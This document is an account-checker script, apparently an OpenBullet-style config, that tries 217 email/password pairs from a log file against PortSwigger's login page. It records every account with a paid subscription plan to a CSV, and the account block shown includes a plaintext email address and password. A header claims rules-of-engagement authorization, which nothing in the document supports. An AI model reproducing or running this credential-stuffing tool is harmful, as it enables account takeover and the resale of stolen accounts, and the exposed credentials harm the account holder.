## PortSwigger Subscription Plan Extractor - All 217 Accounts
## Authorization: ROE-2026-PSW-042-V5

SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"
SET VAR "outputFile" "extracted_plans.csv"
SET VAR "paidCount" "0"

PRINT "[*] PortSwigger Subscription Plan Extractor"
PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
PRINT "[*] Processing 217 accounts from log.txt"
PRINT ""

FileDelete $"<outputFile>"
FileWrite $"<outputFile>" "email,password,plan"


## ================ ACCOUNT 1/217 ================
SET VAR "email" "01.02shivamsingh@gmail.com"
SET VAR "password" "o8LnJe#2,46&Z5t5(,_LW^x!4^zxH8b9"
PRINT "[1/217] $<email>... " White NoNewline

TRY
  HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "lr1"
  HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
    CONTENT "username=$<email>&password=$<password>&action=default"
    CONTENTTYPE "application/x-www-form-urlencoded"
    -> VAR "lr2"
  HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True -> VAR "lr3"
  
  SET VAR "plan" "free"
  IF $"<lr3>" Contains "Professional"
    SET VAR "plan" "Professional"
  ELSE
    IF $"<lr3>" Contains "Enterprise"
      SET VAR "plan" "Enterprise"
    ELSE
      IF $"<lr3>" Contains "Community"
        SET VAR "plan" "Community"
      ENDIF
    ENDIF
  ENDIF
  
  IF $"<plan>" != "free"
    FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>"
    PRINT "✓ $<plan>" Green
    SET VAR "paidCount" $"<paidCount> + 1"
  ELSE
    PRINT "○ free" White
  ENDIF
CATCH
  PRINT "✗ error" Red
ENDTRY

